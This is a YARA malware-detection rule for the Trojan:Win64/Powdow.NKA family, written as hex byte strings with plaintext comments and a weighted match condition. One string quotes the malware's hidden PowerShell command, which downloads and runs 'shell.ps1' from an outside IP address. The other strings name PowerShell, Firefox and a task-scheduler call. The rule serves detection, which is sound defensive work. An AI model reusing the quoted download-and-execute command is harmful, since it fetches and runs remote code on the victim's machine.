
rule Trojan_Win64_Powdow_NKA_MTB{
	meta:
		description = "Trojan:Win64/Powdow.NKA!MTB,SIGNATURE_TYPE_PEHSTR_EXT,08 00 08 00 07 00 00 "
		
	strings :
		$a_81_0 = {54 61 73 6b 53 63 68 65 64 75 6c 65 72 43 72 65 61 74 65 53 63 68 65 64 75 6c 65 } //1 TaskSchedulerCreateSchedule
		$a_81_1 = {2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65 6e 20 2d 43 6f 6d 6d 61 6e 64 20 22 49 45 58 28 4e 65 77 2d 4f 62 6a 65 63 74 20 53 79 73 74 65 6d 2e 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 53 74 72 69 6e 67 28 27 68 74 74 70 3a 2f 2f 31 37 36 2e 31 32 34 2e 32 30 36 2e 38 38 3a 39 35 37 38 2f 73 68 65 6c 6c 2e 70 73 31 } //2 -WindowStyle Hidden -Command "IEX(New-Object System.Net.WebClient).DownloadString('http://176.124.206.88:9578/shell.ps1
		$a_81_2 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 } //1 powershell.exe
		$a_81_3 = {66 69 72 65 66 6f 78 2e 65 78 65 } //1 firefox.exe
		$a_81_4 = {43 3a 5c 65 74 61 6c 6f 6e 5c 50 6f 63 4c 6f 77 49 4c 5c 78 36 34 5c 52 65 6c 65 61 73 65 5c 50 6f 63 4c 6f 77 49 4c 2e 70 64 62 } //1 C:\etalon\PocLowIL\x64\Release\PocLowIL.pdb
		$a_81_5 = {4e 64 72 43 6c 69 65 6e 74 43 61 6c 6c 32 } //1 NdrClientCall2
		$a_81_6 = {44 6c 6c 45 78 70 6f 72 74 } //1 DllExport
	condition:
		((#a_81_0  & 1)*1+(#a_81_1  & 1)*2+(#a_81_2  & 1)*1+(#a_81_3  & 1)*1+(#a_81_4  & 1)*1+(#a_81_5  & 1)*1+(#a_81_6  & 1)*1) >=8
 
}